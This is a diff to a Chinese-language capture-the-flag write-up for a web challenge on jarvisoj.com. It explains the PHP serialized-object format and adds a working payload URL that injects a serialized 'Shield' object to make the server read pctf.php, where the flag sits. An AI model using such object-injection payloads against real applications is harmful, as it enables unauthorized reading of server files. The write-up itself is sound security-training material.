@@ -112,6 +112,15 @@ ascii: 'or'6É]é!r,ùíb
 	}
 ?>
 ```
-显然存在反序列化漏洞
 
-利用反序列化漏洞构造payload去读取pctf.php
+利用反序列化构造payload去读取pctf.php
+
+对象（object）通常被序列化为：
+
+`O:<length>:"<class name>":<n>:{<field name 1><field value 1><field name 2><field value 2>...<field name n><field value n>}`
+
+因此在构造payload时要写上file name 和 value
+
+payload: `http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}`
+
+flag在源代码中
